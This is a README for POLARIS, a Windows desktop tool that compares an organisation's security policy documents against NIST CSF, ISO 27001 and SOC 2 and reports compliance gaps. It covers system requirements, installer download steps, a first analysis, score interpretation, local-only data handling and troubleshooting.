# 🛡️ POLARIS - Identify security gaps in your policy

[![](https://img.shields.io/badge/Download-POLARIS_for_Windows-blue.svg)](https://github.com/macald8935/POLARIS/releases)

POLARIS helps you manage your cybersecurity posture. This tool scans your internal policy documents to find missing requirements from standards like NIST CSF, ISO 27001, and SOC 2. The software runs entirely on your machine. You keep your data private and offline.

## 📋 What POLARIS does

Large organizations use complex frameworks to manage security. POLARIS simplifies this by comparing your written policies against industry benchmarks. It uses natural language processing to identify areas where your current documentation does not meet required standards. It generates clear PDF reports that highlight these gaps for your review.

## 💻 System requirements

Before you install this software, ensure your computer meets these minimum specifications:

- Operating System: Windows 10 or Windows 11 (64-bit).
- Memory: 8 GB of RAM.
- Processor: Dual-core 2.0 GHz processor or better.
- Storage: 500 MB of available space for the application and database files.
- Internet: Only needed for the initial download.

## 📥 How to download and install

1. Visit the [official releases page](https://github.com/macald8935/POLARIS/releases) to download the application.
2. Select the file named `POLARIS-Setup.exe` from the latest release list.
3. Save the file to your computer.
4. Locate the file in your downloads folder.
5. Double-click the file to start the installer.
6. Follow the on-screen prompts to complete the setup process.
7. Click the POLARIS icon on your desktop to open the program.

## ⚙️ Running your first analysis

1. Launch POLARIS from your desktop.
2. Select the framework button at the top of the window, such as ISO 27001.
3. Click the Import button to select your policy documents from your computer.
4. POLARIS accepts PDF, DOCX, and TXT files.
5. Press the Run Analysis button to begin the scan. 
6. Wait for the progress bar to finish.
7. Navigate to the Reports tab to view your findings.
8. Click Export to save the analysis as a PDF.

## 🔍 Understanding your results

The results screen displays a list of compliance gaps. Each item shows the specific requirement from the standard and the corresponding text from your policy. A score indicates how well your document matches the requirement. 

- High score: Your policy aligns with the framework.
- Medium score: Your policy covers the concept but lacks specific details.
- Low score: Your policy lacks the necessary language to satisfy the requirement.

## 🔒 Data privacy

POLARIS operates in a local environment. Your files never leave your computer. The engine processes your documents within the application memory. The software does not store your content on a remote server. You hold full control over your diagnostic data at all times.

## 🛠️ Troubleshooting common issues

If you encounter problems during the installation or analysis, follow these steps:

- Application will not start: Right-click the shortcut and select Run as Administrator.
- Slow analysis: Close other heavy applications like web browsers or video editors to free up system memory.
- Files not detected: Ensure your documents are not password-protected. The engine cannot read encrypted files.
- PDF reports are blank: Verify that you have a PDF viewer installed on your system.
